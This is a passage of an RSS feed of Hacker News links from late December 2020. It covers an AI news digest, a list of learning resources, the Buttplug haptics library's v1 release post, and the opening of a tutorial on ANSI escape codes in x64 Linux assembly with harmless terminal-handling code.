<h2 id="june"><a href="https://lastweekin.ai/p/2689941_new-article-digest-67">June</a></h2>

<p>This month saw the massive protests following <strong>George Floyd</strong>’s killing, leading many to re-examine police conducts in the U.S.
Within the AI community, this often meant questioning police use of facial recognition technologies and the inherent bias in the deployed AI algorithms.
It is under this backdrop that companies like Amazon and IBM put a pause to selling facial recognition software to law enforcement, and many nuanced conversations followed.</p>

<ul>
  <li><a href="https://www.buzzfeednews.com/article/carolinehaskins1/george-floyd-protests-surveillance-technology">Here Are The Minneapolis Police’s Tools To Identify Protesters</a></li>
  <li><a href="https://www.nytimes.com/2020/06/24/technology/facial-recognition-arrest.html">Wrongfully Accused by an Algorithm</a></li>
  <li><a href="https://www.nytimes.com/2020/06/09/technology/facial-recognition-software.html">A Case for Banning Facial Recognition</a></li>
  <li><a href="https://www.technologyreview.com/2020/06/12/1003482/amazon-stopped-selling-police-face-recognition-fight/">The two-year fight to stop Amazon from selling face recognition to the police</a></li>
  <li><a href="https://www.aclu.org/press-releases/aclu-statement-amazon-face-recognition-moratorium">ACLU Statement on Amazon Face Recognition Moratorium</a></li>
  <li><a href="https://medium.com/@Joy.Buolamwini/ibm-leads-more-should-follow-racial-justice-requires-algorithmic-justice-and-funding-da47e07e5b58">IBM Leads, More Should Follow: Racial Justice Requires Algorithmic Justice and Funding</a></li>
  <li><a href="https://venturebeat.com/2020/06/26/ai-weekly-a-deep-learning-pioneers-teachable-moment-on-ai-bias/">A deep learning pioneer’s teachable moment on AI bias</a></li>
</ul>

<p>Other news included:</p>

<ul>
  <li><a href="https://www.technologyreview.com/2020/06/18/1003989/ai-deep-learning-startup-neural-magic-uses-cpu-not-gpu/">The startup making deep learning possible without specialized hardware</a></li>
  <li><a href="https://onezero.medium.com/the-worlds-biggest-a-i-conference-is-going-virtual-and-finally-becoming-more-inclusive-81dc5ff554ec">The World’s Biggest A.I. Conference Is Going Virtual, and Finally Becoming More Inclusive</a></li>
  <li><a href="https://www.technologyreview.com/2020/06/04/1002671/startup-ai-workers-productivity-score-bias-machine-learning-business-covid/">This startup is using AI to give workers a “productivity score”</a></li>
</ul>

<h2 id="july"><a href="https://lastweekin.ai/p/4645049_new-article-digest-72">July</a></h2>

<p>This month the publicitly around OpenAI’s <strong>GPT-3</strong>, a very large and flexible language model, began to soar as the company released results from its private-beta trials.
Although the GPT-3 paper was published in May, it wasn’t until now that people started to realize the extent of its potential applications, from writing code to translating legalese, as well as its limitations and potentials for abuse.</p>

<ul>
  <li><a href="https://www.skynettoday.com/briefs/gpt3">GPT-3: An AI Breakthrough, but not Coming for Your Job</a></li>
</ul>

<p>Other news included:</p>

<ul>
  <li><a href="https://www.vox.com/recode/2020/6/29/21303588/deepfakes-anonymous-artificial-intelligence-welcome-to-chechnya">How deepfakes could actually do some good</a></li>
  <li><a href="https://hai.stanford.edu/blog/ais-carbon-footprint-problem">AI’s Carbon Footprint Problem</a></li>
  <li><a href="https://onezero.medium.com/i-chatted-with-a-therapy-bot-to-ease-my-covid-fears-it-was-bizarre-ccd908264660">I Chatted With a Therapy Bot to Ease My Covid Fears. It Was Bizarre.</a></li>
  <li><a href="https://www.nature.com/articles/d41586-020-02003-2">Don’t ask if artificial intelligence is good or fair, ask how it shifts power</a></li>
  <li><a href="https://venturebeat.com/2020/07/15/mit-researchers-warn-that-deep-learning-is-approaching-computational-limits/">MIT researchers warn that deep learning is approaching computational limits</a></li>
  <li><a href="https://www.statnews.com/2020/07/15/artificial-intelligence-patient-consent-hospitals/">An invisible hand: Patients aren’t being told about the AI systems advising their care</a></li>
  <li><a href="https://www.vogue.com/article/sinead-bovell-model-artificial-intelligence">I Am a Model and I Know That Artificial Intelligence Will Eventually Take My Job</a></li>
  <li><a href="https://www.technologyreview.com/2020/07/24/1005602/ai-hiring-promises-bias-free-job-hopping-prediction/">An AI hiring startup promising bias-free results wants to predict job-hopping</a></li>
</ul>

<h2 id="august"><a href="https://lastweekin.ai/p/4698973_digest-76">August</a></h2>

<p>Next, there was more discussion over GPT-3 kept poping up along with more of the usual concerns about facial recognition, bias, and jobs. Discussion of the Coronavirus has mostly dwindled.</p>

<ul>
  <li><a href="https://www.theverge.com/2020/7/28/21344751/facial-recognition-face-masks-accuracy-nist-study">Face masks are breaking facial recognition algorithms, says new government study</a></li>
  <li><a href="https://www.reuters.com/investigates/special-report/usa-riteaid-software/">Rite Aid deployed facial recognition system in hundreds of U.S. stores</a></li>
  <li>
    <p><a href="https://syncedreview.com/2020/07/30/ai-powered-genderify-platform-shut-down-after-bias-based-backlash/">AI-Powered “Genderify” Platform Shut Down After Bias-Based Backlash</a></p>
  </li>
  <li><a href="https://techcrunch.com/2020/08/02/ai-is-struggling-to-adjust-to-2020/">AI is struggling to adjust to 2020</a></li>
  <li><a href="https://time.com/5876604/machines-jobs-coronavirus/">Millions of Americans Have Lost Jobs in the Pandemic — And Robots and AI Are Replacing Them Faster Than Ever</a></li>
  <li><a href="https://www.theatlantic.com/magazine/archive/2020/09/china-ai-surveillance/614197/">The Panopticon Is Already Here</a></li>
  <li><a href="https://www.wired.com/story/cheap-easy-deepfakes-closer-real-thing/">Cheap, Easy Deepfakes Are Getting …</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.skynettoday.com/digests/year-2020">https://www.skynettoday.com/digests/year-2020</a></em></p>]]>
            </description>
            <link>https://www.skynettoday.com/digests/year-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561689</guid>
            <pubDate>Mon, 28 Dec 2020 18:29:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn new skills]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561492">thread link</a>) | @baobabKoodaa
<br/>
December 28, 2020 | https://www.attejuvonen.fi/learn/ | <a href="https://web.archive.org/web/*/https://www.attejuvonen.fi/learn/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Great learning materials are rare. This is a collection of gems I’ve encountered over the years, presented as a 90’s style web link list, intended for anyone who wants to learn new skills.</p>
<hr>

<p><a href="https://www.coursera.org/learn/machine-learning" target="_blank">Machine Learning Coursera Course</a> by Andrew Ng</p>
<p><strong>Skill:</strong> Machine Learning — learn how to apply existing machine learning techniques, understand why they work, and how to troubleshoot issues.</p>
<p><strong>Type of material:</strong> Videos and coding exercises</p>
<p><strong>Why is it good:</strong> Great interplay between lectures and exercises. Clarity of explanations. Introductory scope. Enough math to understand why these methods work, but not too much.</p>
<hr>

<p><a href="https://cses.fi/book/index.php" target="_blank">Competitive Programmer’s Handbook</a> by Antti Laaksonen</p>
<p><strong>Skill:</strong> Exact algorithms — learn how to invent algorithms for ”code competition” -type problems (problems where exactly-correct answer is required and the main challenge is time or memory complexity).</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> Simplified explanations of many algorithmic techniques and algorithmic problem solving approaches. Unlike most algorithm books, this one is focused on ideas and code, not on the underlying math. This is the ”bible” of Finnish competitive programmers.</p>
<hr>

<p><a href="https://cs.gmu.edu/~sean/book/metaheuristics/" target="_blank">Essentials of Metaheuristics</a> by Sean Luke</p>
<p><strong>Skill:</strong> Optimization algorithms — learn techniques to find ”good enough” solutions for problems where an exactly-correct solution is not required. Typically used when an exact algorithm would be computationally infeasible and machine learning methods can not be applied. For example, route optimization often falls into this category.</p>
<p><strong>Type of material:</strong> Book</p>
<p><strong>Why is it good:</strong> A practical approach. Scope. Clarity of explanations. I recommend you to read this book while implementing and testing selected approaches on a real problem as you go along.</p>
<hr>

<p><a href="https://www.youtube.com/channel/UC1usFRN4LCMcfIV7UjHNuQg/videos" target="_blank">Introduction to Cryptography</a> by Christof Paar</p>
<p><strong>Skill:</strong> Cryptography</p>
<p><strong>Type of material:</strong> Videos</p>
<p><strong>Why is it good:</strong> Clarity of explanations and visual illustrations. Entertaining presentation style.</p>
<hr>

<p><a href="https://www.datacamp.com/community/tutorials/how-to-become-a-data-scientist" target="_blank">Become a Data Scientist</a> by DataCamp</p>
<p><strong>Skill:</strong> Data Science</p>
<p><strong>Type of material:</strong> Infographic</p>
<p><strong>Why is it good:</strong> The entire field, from all angles, in one beautiful illustration.</p>
<hr>

<p><a href="https://scrimba.com/learn/learnreact" target="_blank">Scrimba React course</a> by Bob Ziroll</p>
<p><strong>Skill:</strong> ReactJS — learn React fundamentals and practical coding skills</p>
<p><strong>Type of material:</strong> Interactive screencasts</p>
<p><strong>Why is it good:</strong> A modern way of combining lecture/presentation -elements and a development environment where you can practice on code exercises. Runs in your browser.</p>
<hr>

<p><a href="https://www.bloomberg.com/opinion/authors/ARbTQlRLRjE/matthew-s-levine" target="_blank">Money Stuff</a> by Matt Levine</p>
<p><strong>Skill:</strong> Finance — learn that everything is securities fraud.</p>
<p><strong>Type of material:</strong> Email newsletter</p>
<p><strong>Why is it good:</strong> Marvelous writing style. Unpacks recent events in finance with simplicity and wit, often connecting them to larger themes that run through the newsletter over time. Hugely entertaining and educational. Also released as web articles if you don’t want to give out your email.</p>
<hr>

<p><a href="https://learningmusic.ableton.com/" target="_blank">Learning Music</a> by Ableton</p>
<p><strong>Skill:</strong> Composing music</p>
<p><strong>Type of material:</strong> Interactive website</p>
<p><strong>Why is it good:</strong> Experiment with composing music directly in your browser. No previous experience required. The tutorial begins with simple composing examples and tasks along with teaching basic fundamentals of music.</p>
<hr>
<br></div></div></div>]]>
            </description>
            <link>https://www.attejuvonen.fi/learn/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561492</guid>
            <pubDate>Mon, 28 Dec 2020 18:13:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buttplug (Sex Toy Control Library) Hits v1 Milestone]]>
            </title>
            <description>
<![CDATA[
Score 300 | Comments 121 (<a href="https://news.ycombinator.com/item?id=25561392">thread link</a>) | @qdot76367
<br/>
December 28, 2020 | https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/ | <a href="https://web.archive.org/web/*/https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		
<p>After 3.5 years of development, <a href="https://buttplug.io/">Buttplug</a>, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it’s also the first real blog post on the new <a href="https://nonpolynomial.com/blog">Nonpolynomial Blog</a>!</p>



<figure><img loading="lazy" width="640" height="640" src="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png" alt="" srcset="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png 640w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-300x300.png 300w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-150x150.png 150w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-100x100.png 100w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-480x480.png 480w" sizes="(max-width: 640px) 100vw, 640px"></figure>



<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust – <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# – <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) – <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.</p>



<p>If you’re curious about what users are doing with Buttplug, <a href="https://github.com/buttplugio/awesome-buttplug">check out our awesome-buttplug project list repo</a>.</p>



<h2>A Short-ish History of Buttplug</h2>



<p>Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>



<ul><li>2004<ul><li><a href="https://kyle.machul.is/">Kyle</a> starts <a href="https://metafetish.com/">Slashdong (which became Metafetish, now defunct)</a> to write about sex tech engineering.</li></ul></li><li>2007<ul><li><a href="https://youtu.be/FRLygav4tcs">Kyle gives a presentation at Arse Elektronika mentioning “Obfuscated Macros”</a>, which at the time seemed like a great name because Kyle was a 20-something engineer. This idea would grow to become the basis of Buttplug.</li></ul></li><li>2013<ul><li><a href="https://github.com/buttplugio/buttplug-py-deprecated">First Python implementation, known as “Fuck Everything”.</a> Uses ZeroMQ and Python 2. Never full shipped due to issues with python application redistribution, as well as lack of hardware on the market to support.</li></ul></li><li>Fall 2016<ul><li><a href="https://github.com/buttplugio/buttplug-rs">First Rust implementation.</a> Stalls due to lack of platform support for Bluetooth (most hardware we interact with is Bluetooth LE) and other hardware.</li></ul></li><li>April 2017<ul><li><a href="https://github.com/buttplugio/buttplug-csharp">First C# implementation, using the recently released UWP BTLE APIs for Windows.</a> Library gains momentum and project takes off, also establishing a <a href="https://buttplug-protocol-spec.docs.buttplug.io/">protocol spec</a> to ensure compatibility between versions.</li></ul></li><li>May 2017<ul><li><a href="https://github.com/buttplugio/buttplug-js">First JS implementation</a>, using WebBluetooth to access BTLE through the Chrome web browser. Later included native Node implementation using <a href="https://github.com/noble/noble">noble</a> and other hardware libraries.</li></ul></li><li>August 2017<ul><li>Kyle incorporates <a href="https://nonpolynomial.com/">Nonpolynomial</a></li></ul></li><li>December 2017<ul><li>Generic messages added to the Buttplug Protocol Spec, making it easier to command a wide range of devices. Due to maintenance timing and life in general, this is the last change to protocol spec for the next 3 years.</li></ul></li><li>April 2019<ul><li><a href="https://github.com/buttplugio/buttplug-py">Python implementation of Client API for Buttplug.</a> All hardware access was still managed via either JS or C# implementations.</li></ul></li><li>May 2019<ul><li>Established the <a href="https://intiface.com/">Intiface brand</a> for Buttplug applications developed by <a href="https://nonpolynomial.com/">Nonpolynomial</a>.</li></ul></li><li>Sept 2019<ul><li>Realize that maintaining 2 full implementations of Buttplug was untenable for a 1 person development team, work started on a new core implementation of Buttplug in (at that point unstable) async Rust, with other language implementations would then live on top of.</li></ul></li><li>January 2020<ul><li>Forked <a href="https://github.com/mwylde/rumble">Rumble</a> into <a href="https://github.com/deviceplug/btleplug">btleplug</a> (begrudgingly changing the name because rumble would’ve been GREAT to have in Buttplug but the original author was AWOL so package couldn’t be transfers on crates.io), brought up minimum BTLE capabilities in Windows, macOS, and Linux.</li></ul></li><li>October 2020<ul><li>Core async Rust Buttplug implementation hits feature parity with the C# and JS libraries. <a href="https://github.com/buttplugio/buttplug-rs-ffi">Move to porting C#/JS to using Rust via FFI</a>. C# calls into the native Rust library using exported C calls, while JS uses a WASM layer.</li></ul></li><li>December 2020<ul><li>v1 release, along with the first shipping of a new spec version since December 2017. FFI C#/JS libraries at parity with original native C#/JS libraries, original native libraries deprecated and archived. <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> in good enough shape to guide users on building simple Buttplug Applications. <a href="https://metafetish.com/">Metafetish</a> closes after 16 years in order to make way for new <a href="https://nonpolynomial.com/blog">Nonpolynomial blog</a>.</li></ul></li></ul>



<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.</p>



<h2>What’s Next</h2>



<p>There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>



<h2>Thanks</h2>



<p>Thanks go to:</p>



<ul><li>Loved ones and friends who’ve had to put up with me being “The Buttplug Guy” for the past 16 years (with no sign of that ending soon).</li><li>My <a href="https://patreon.com/qdot">Patreon</a> and <a href="https://github.com/sponsors/qdot">Github Sponsors</a> Subscribers, who’ve kept the project funded enough for me to buy new hardware.</li><li>My consulting clients for <a href="https://nonpolynomial.com/">Nonpolynomial</a>, who’ve helped keep the business cash positive while also helping my project along with support in their products.</li><li>Everyone who worked on reverse engineering toys and donating info to our <a href="https://stpihkal.docs.buttplug.io/">Sex Toys Protocols I Have Known And Loved (STPIHKAL) </a>documentation project.</li><li>Sex tech projects like <a href="https://iostindex.com/">IOSTI…</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</a></em></p>]]>
            </description>
            <link>https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561392</guid>
            <pubDate>Mon, 28 Dec 2020 18:01:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Having fun with ANSI codes and x64 Linux Assembly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561350">thread link</a>) | @guitmz
<br/>
December 28, 2020 | https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/ | <a href="https://web.archive.org/web/*/https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
      

<h3 id="overview">Overview</h3>

<p>How can one not find command line art amusing? Specially when we are talking about computer viruses and even more so when referencing MS-DOS ones. The 16 bit era gave us some of the most interesting <a href="https://www.wired.com/2013/10/15-awesome-looking-viruses-from-the-ms-dos-era/">computer virus payloads</a> of all time, but achieving something like this today is not as <em>“trivial”</em> anymore.</p>

<p>As Linux is my OS of choice, I wanted to find something that could get close to these MS-DOS fun payloads for my own modern viruses, and, while it’s possible to <a href="http://seenaburns.com/2018/04/04/writing-to-the-framebuffer/">write directly to the framebuffer</a>, I wanted to try something related to terminal emulators instead. Enter <strong><em>ANSI escape sequences</em></strong>.</p>

<h3 id="how-it-works">How it works</h3>

<blockquote>
<p><em>ANSI escape sequences are a standard for <a href="https://en.wikipedia.org/wiki/In-band_signaling">in-band signaling</a> to control cursor location, color, font styling, and other options on video <a href="https://en.wikipedia.org/wiki/Text_terminal">text terminals</a> and <a href="https://en.wikipedia.org/wiki/Terminal_emulator">terminal emulators</a>. Certain sequences of <a href="https://en.wikipedia.org/wiki/Byte">bytes</a>, most starting with an <a href="https://en.wikipedia.org/wiki/Escape_character#ASCII_escape_character">ASCII Escape</a> and <a href="https://en.wikipedia.org/wiki/Bracket">bracket</a> character followed by parameters, are embedded into text. The terminal interprets these sequences as commands, rather than text to display verbatim.</em></p>

<p><em>ANSI sequences were introduced in the 1970s to replace vendor-specific sequences and became widespread in the computer equipment market by the early 1980s. They are used in development, scientific, commercial text-based applications as well as <a href="https://en.wikipedia.org/wiki/Bulletin_board_system">bulletin board systems</a> to offer standardized functionality.</em></p>

<p><em>Read more: <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">https://en.wikipedia.org/wiki/ANSI_escape_code</a></em></p>
</blockquote>

<p>Lots and lots of things you use daily are probably using ANSI escape codes, every time you see colored text on your terminal. Text-based user interfaces, a.k.a <a href="https://en.wikipedia.org/wiki/Text-based_user_interface">TUIs</a> need these control codes to <em>“draw”</em> what you see on your screen.</p>

<p><code>ESC</code> is represented by the well known <code>0x1b</code> <a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#ESC">control byte</a> and the usage is as simple as using <code>printf</code> or <code>echo</code> to write the codes to <code>STDOUT</code> (keep in mind that the terminal you are using must support the ANSI sequences, look for <code>termcap</code> , <code>terminfo</code> and <code>infocmp</code> if you need).</p>

<p>There are some very good references for ANSI escape codes around the web, like the one at <a href="https://wiki.bash-hackers.org/scripting/terminalcodes">Bash Hackers Wiki</a>.</p>

<h3 id="code">Code</h3>

<p>While ANSI sequences are rather easy to use in any modern programming language, the same cannot be said for Assembly, mainly because the manual work involved when dealing with strings (I’m talking about pure Assembly, without including any external functions like <code>printf</code> and without invoking <a href="https://linux.die.net/man/1/tput">tput</a>).</p>

<p>Note that my code currently relies on <a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">ioctl</a> Linux system call to manipulate special files (like terminals) but <a href="https://man7.org/linux/man-pages/man3/termios.3.html">termios</a> would be a better approach here instead and I have kept <strong>ioctl</strong> because I wanted to re-use some old code snippet I wrote long time ago, before I knew about <strong>termios</strong>. I imagine it should be fairly easy to make the change if you want to and I plan to do it in the future.</p>

<p>From <a href="https://man7.org/linux/man-pages/man4/tty_ioctl.4.html">ioctl_tty</a> man page:</p>





<p>
  

Use of ioctl makes for nonportable programs.  Use the POSIX interface described in termios(3) whenever possible.


</p>



<p>A little helper program written in <code>C</code> like the one below can be used display the terminal dimensions (rows and columns) with <code>ioctl</code>:</p>

<div><pre><code data-lang="C"><span>#include</span> <span>&lt;sys/ioctl.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span> <span>main</span> <span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>struct</span> <span>winsize</span> <span>ws</span><span>;</span>
  <span>ioctl</span> <span>(</span><span>STDIN_FILENO</span><span>,</span> <span>TIOCGWINSZ</span><span>,</span> <span>&amp;</span><span>ws</span><span>);</span>

  <span>printf</span> <span>(</span><span>"lines %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_row</span><span>);</span>
  <span>printf</span> <span>(</span><span>"columns %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_col</span><span>);</span>

  <span>return</span> <span>0</span><span>;</span>
<span>}</span></code></pre></div>

<p>Anyway, the example application I wrote will do the following:</p>

<ul>
<li>Save current terminal buffer (<code>ESC[?1049h</code>)</li>
<li>Clear screen (<code>ESC[2J</code>)</li>
<li>Invoke <code>ioctl</code> syscall to retrieve current window dimensions (rows and columns)</li>
<li>Use of the result from <code>ioctl</code> and perform some math to create a cursor, setting its rows and columns <code>(x, y)</code> position to more or less the center of the screen (<code>ESC[x;yH</code>)</li>
<li>Loop using <code>nanosleep</code> and <code>write</code> syscalls to simulate a <em>typewriter</em> effect while we write our message to the screen, byte by byte, including any extra ANSI sequences for formatting</li>
</ul>

<p>You can find the full commented source code with further instructions, all auxiliar functions and variable declarations on <a href="https://github.com/guitmz/ansi-escape">GitHub</a> but let’s go over the mentioned key steps above to understand it better.</p>

<ul>
<li>Saving current terminal buffer by writting <code>ESC[?1049h</code> (represented by <code>save_buffer</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>save_buffer</span><span>]</span>     <span>; loading rsi with ANSI code that saves current terminal buffer</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>save_buffer_size</span>  <span>; loading rdx with save ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                    <span>; saving current terminal</span></code></pre></div>

<ul>
<li>Clearing the screen by writting ESC[2J (represented by <code>clear_screen</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cl</span><span>ear_screen</span><span>]</span>     <span>; loading rsi with ANSI code that clears screen</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>cl</span><span>ear_screen_size</span>  <span>; loading rdx with clear screen ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                     <span>; clearing the screen</span></code></pre></div>

<ul>
<li>Invoking <code>ioctl</code> syscall to retrieve terminal window size (this approach is not always guaranteed to give results and it’s safer to use it in conjunction to a lookup in the <code>termcap</code> database).</li>
</ul>

<div><pre><code data-lang="nasm">    <span>xor</span> <span>rdi</span><span>,</span> <span>rdi</span>         <span>; this means fd will be STDIN (same as "mov rdi, STDIN")</span>
    <span>mov</span> <span>rsi</span><span>,</span> <span>TIOCGWINSZ</span>  <span>; ioctl command to get window size</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>winsz</span>       <span>; winsz struct will contain terminal size information</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_IOCTL</span>
    <span>syscall</span>
    
    <span>call</span> <span>create_cursor</span>   <span>; creating ANSI code that moves to proper coordinates (result format: "ESC[x;yH")</span></code></pre></div><p>
​       It will populate <code>winsz</code> struct with the result values. More information on the <code>TIOCGWINSZ</code> command can be found <a href="http://www.delorie.com/djgpp/doc/libc/libc_495.html">here</a></p>

<div><pre><code data-lang="nasm"><span>struc</span><span>t</span> <span>WINSZ</span>
    <span>.ws_row</span>     <span>dw</span> <span>?</span>     <span>; rows, in characters</span>
    <span>.ws_col</span>     <span>dw</span> <span>?</span>     <span>; columns, in characters</span>
